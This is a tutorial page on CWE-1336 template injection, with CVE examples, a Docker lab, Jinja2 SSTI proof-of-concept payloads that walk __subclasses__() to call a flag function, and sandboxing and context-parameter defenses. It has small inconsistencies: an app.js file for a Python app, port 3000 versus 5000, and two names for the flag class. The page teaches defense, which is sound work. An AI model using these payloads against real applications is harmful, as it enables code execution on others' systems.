---
categories:
  - daily_cwe
title: "CWE-1336: Template Injection"
tags: 
  - CWE-1336
  - template injection
  - ssti
  - csti
---
# IMPROPER NEUTRALIZATION OF SPECIAL ELEMENTS USED IN A TEMPLATE ENGINE

## Descritpion

Many web applications use template engines that allow developers to insert externally-influenced values into free text or messages in order to generate a full web page, document, message, etc. Such engines include Twig, Jinja2, Pug, Java Server Pages, FreeMarker, Velocity, ColdFusion, Smarty, and many others - including PHP itself. Some CMS also use templates.

Template engines often have their own custom command or expression language. If an attacker can influence input into a template before it is processed, then the attacker can invoke arbitrary expressions, i.e perform injection attacks. For example, in some template languages, an attacker could inject the expression `{{ '7' * 7 }}` and determine if the output returns `49` or `7777777` instead. The syntax varies depending on the language.

In some cases, XSS-style attack can work, which can obscure the root cause if the developer does not closely investigate the root cause of the error.

Template engines can be used on the server or client so both "sides" could be affected by injection. The mechanisms of attack or the affected technologies mightt be different, but the mistake is fundamentally the same.

### Alternate terms

1. SSTI
2. CSTI

### Selected Observed Examples

| CVE | Note |
| :--- | :--- |
| **CVE-2024-34359** | Chain: Python bindings for LLM library do not use a sandboxed environment when parsing a template and constructing a prompt, allowing jinja2 SSTI and code execution - one variant of a prompt injection attack |
| **CVE-2017-16783** | SSTI in content management server |
| **CVE-2020-9437** | Authentication/Identity management product has CSTI |
| **CVE-2021-21244** | DevOps platform allows SSTI |
| **CVE-2020-26282** | Web browser proxy server allows Java EL expressions from SSTI  |
| **CVE-2020-1961** | SSTI involving mail templates and JEXL expressions |

### Potential Mitigations

1. Choose a template engine that offers a sandbox or restricted mode, or at least limits the power of any available expressions, function calls, or commands. (Architecture & Design)
2. Use the template engine's sandbox or restricted mode, if available

## Implementation

### Basic project structure
```
.
├── Dockerfile
├── requirements.txt
├── app.js
```

requirements.txt
```
--8<-- "docs/daily_cwe/cwe-1336/source/requirements.txt"
```

Dockerfile
```Dockerfile
--8<-- "docs/daily_cwe/cwe-1336/source/Dockerfile"
```

app.js
```js
--8<-- "docs/daily_cwe/cwe-1336/source/app.js"
```

### Deploy

```docker
docker build -t ssti-demo .
docker run -d -p 3000:3000 --name ssti-lab ssti-demo
```

### PoC

**Goal : ** Check `__subclasses__()` in Python process to find `FlagHolder` and call `get_flag()`

Step 1: Check SSTI 

Send the request `http://localhost:5000/?name={{7*7}}`

Step 2: Lists all subclasses

Send the payload 
```
http://localhost:5000/?name={{''.__class__.__mro__[1].__subclasses__()}}
```

Step 3: Find the index and get flag

```
http://localhost:5000/?name={{''.__class__.__mro__[1].__subclasses__()[412]().get_flag()}}
```

```
http://localhost:5000/?name={% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'CTFFlagHolder' %}{{ c().get_flag() }}{% endif %}{% endfor %}
```

### Defense

#### 1. Passing data by Context Parameters

Instead of concatenating unsafely, pass the data in `render_template_string` or `render_template` function. The code below makes `user_name` become string variable.

```python
@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    return render_template_string("<h1>Hello, {{ user_name }}</h1>", user_name=name)
```

#### 2. Sandboxing

Using sandbox environment such as `SandboxedEnvironment` in Jinja2 to limit the dangerous properties like `__class__`, `__globals__`

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{ user_name }}")
output = template.render(user_name=name)
```